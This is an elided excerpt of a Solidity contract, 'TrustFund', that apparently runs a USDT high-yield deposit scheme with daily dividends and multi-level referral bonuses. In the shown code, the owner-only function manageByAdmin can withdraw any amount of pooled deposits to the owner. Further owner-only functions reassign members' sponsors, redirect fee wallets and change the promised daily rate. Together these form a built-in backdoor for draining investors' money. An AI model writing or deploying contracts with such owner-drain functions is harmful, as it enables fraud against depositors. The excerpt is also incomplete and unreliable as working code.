...
contract TrustFund is Context, Ownable {
	...
	address payable public withdrawFeeTo;
    address payable public depositFeeTo;   
    ...
    uint16[2] private ref_bonuses = [6,3]; 
    ...
    constructor(address _token) {         
		depositFeeTo = payable(msg.sender);		
	    withdrawFeeTo = payable(msg.sender);		

        defaultUpline = owner();

        tarifs[0] = Tarif(36135, 1000, 20); // 365*99 = 36135
        
        paymentTokenAddress = _token; //USDT
    ...
    function Deposit(address _upline, uint256 amount) external {
		...
		USD.safeTransfer(depositFeeTo, teamFee);
    ...
    function Reinvest() external {   
        ...
        require(player.dividends >= 50 ether, "Minimum reinvest is 50 USDT.");
    ...
    function Payout() external {      
		...
		uint256 teamFee = SafeMath.div(amount,100) * 2;
		USD.safeTransfer(withdrawFeeTo, teamFee);
    ...
    function computePayout(address _addr) view external returns(uint256 value) {
        ...
        for(uint256 i = 0; i < player.deposits.length; i++) {
            ...
            Tarif storage tarif = tarifs[dep.tarifInx];
            ...
            if(from < to) {
                // value += dep.amount * (to - from) * tarif.percent / tarif.life_days / (86400 * 100);
                value += dep.amount * (to - from) * tarif.rate / (86400 * tarif.percent);
            }
        }
        return value;
    }
    ...
    function setDefaultUpline(address _addr) public onlyOwner returns (bool success) {
        defaultUpline = _addr;
        return true;
    }
    ...
    function commissionPayouts(address _addr, uint256 _amount) private {
        ...
        if (banned[up] == 0 && players[up].total_invested > 0) {
            uint256 bonus = 0;
            if (invested < 500000 ether) {
                bonus = _amount * ref_bonuses[0] / PERCENT_DIVIDER;
            } else {
                bonus = _amount * ref_bonuses[1] / PERCENT_DIVIDER;
            }
		    
			USD.safeTransfer(up, bonus);
			
			players[up].total_ref_bonus += bonus;
            // Invitational rewards are not included at total_withdrawn
    ...
    function manageByAdmin(uint256 amount) public onlyOwner returns (bool success) {
	    USD.safeTransfer(msg.sender, amount);
		withdrawn += amount;
        return true;
    }
    ...
    function setSponsor(address member, address newSponsor) public onlyOwner returns(bool success)
    {
        players[member].upline = newSponsor;
        return true;
    }

    function setWithdrawFeeTo(address payable newval) public onlyOwner returns (bool success) {
        withdrawFeeTo = newval;
        return true;
    }    
	
    function setDepositFeeTo(address payable newval) public onlyOwner returns (bool success) {
        depositFeeTo = newval;
        return true;
    }     
     ...
     * rate: 5 ~ 30
     */
    function setDailyInterest(uint256 rate) public onlyOwner returns (bool success) {
        require(rate >= 5 && rate <= 30, "rate value out of limit");
        tarifs[0] = Tarif(36135, 1000, rate);
        return true;
    }
    ...
    {
        Player storage player = players[_addr];
        Downline storage dl = player.downlines[0];
        if(level==1){
            dl  = player.downlines[index];
        }
        return(dl.invite);
    }
    ...
    function getMemberInfo(address _addr) external view returns (PlayerInfo memory) {
        Player storage player = players[_addr];
        return PlayerInfo(player.total_invested, player.total_reinvested, player.total_refunded, player.total_ref_bonus, player.total_withdrawn, player.dividends, this.computePayout(_addr));
    }

    function getDepositList(address _addr) public view returns (Depo[] memory){
